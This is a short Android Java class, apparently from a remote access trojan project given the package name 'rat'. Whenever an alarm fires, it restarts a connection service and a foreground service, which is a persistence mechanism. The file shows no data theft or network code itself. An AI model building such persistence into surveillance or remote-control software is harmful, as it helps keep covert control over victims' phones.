package com.fly0rakoon.rat.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class AlarmReceiver extends BroadcastReceiver {
    private static final String TAG = "AlarmReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Alarm received - restarting services");
        
        // Restart ConnectionService
        Intent connectionIntent = new Intent(context, ConnectionService.class);
        context.startService(connectionIntent);
        
        // Restart ForegroundService
        Intent foregroundIntent = new Intent(context, ForegroundService.class);
        context.startService(foregroundIntent);
    }
}
